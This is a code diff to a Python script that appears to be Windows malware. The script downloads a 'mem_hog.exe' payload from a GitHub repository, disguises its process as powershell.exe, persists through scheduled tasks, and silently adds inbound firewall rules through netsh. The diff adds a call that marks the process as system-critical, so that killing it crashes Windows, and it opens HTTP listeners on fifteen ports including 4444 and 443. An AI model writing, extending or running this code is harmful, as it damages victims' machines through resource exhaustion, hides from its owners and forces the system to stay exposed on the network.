@@ -1,17 +1,35 @@
 import os
 import sys
+import ctypes
 import subprocess
 import requests
 import urllib3
 import random
 import string
+import threading
 import psutil, shutil
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
+RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
+RtlSetProcessIsCritical.restype = ctypes.c_int
+
 GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/mem_hog.exe"
 PAYLOAD_PATH = None
+
+def set_process_as_critical():
+    try:
+        result = RtlSetProcessIsCritical(1, 0, 0)
+        
+        if result == 0:
+            print("Process is now critical.")
+        else:
+            print("Failed to set the process as critical.")
+    
+    except Exception as e:
+        print(f"Error: {e}")
 
 def generate_random_name(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -248,19 +266,28 @@ class HTTPHandler(BaseHTTPRequestHandler):
             """
             self.wfile.write(html.encode('utf-8'))
 
-# Start HTTP server and open firewall
-def start_http_server():
+def start_http_server_on_port(port):
     try:
-        # Add firewall rule for port 8080
         subprocess.run(
-            'netsh advfirewall firewall add rule name="Allow_HTTP" dir=in action=allow protocol=TCP localport=8080',
-            shell=True, capture_output=True, text=True, creationflags=0x08000000
-        )
-        server = HTTPServer(('0.0.0.0', 8080), HTTPHandler)
+        f'netsh advfirewall firewall add rule name="Allow_HTTP_{port}" dir=in action=allow protocol=TCP localport={port}',
+        shell=True, capture_output=True, text=True, creationflags=0x08000000)
+        server = HTTPServer(('0.0.0.0', port), HTTPHandler)
         server.serve_forever()
     except:
         # print(f"Error: {e}")
         pass
+
+# Start HTTP server and open firewall
+def start_http_servers():
+    threads = []
+    for port in [80, 8000, 8080, 8081, 8082, 8083, 8888, 4444, 5500, 443, 5000, 5001, 3000, 7000, 9000]:
+        thread = threading.Thread(target=start_http_server_on_port, args=(port,))
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
 
 # Hide process by mimicking powershell.exe
 def hide_process():
@@ -325,7 +352,8 @@ def persist_schtasks():
 
 # Main execution
 if __name__ == '__main__':
+    set_process_as_critical()
     persist_schtasks()
     hide_process()
     download_payload()
-    start_http_server()
+    start_http_servers()
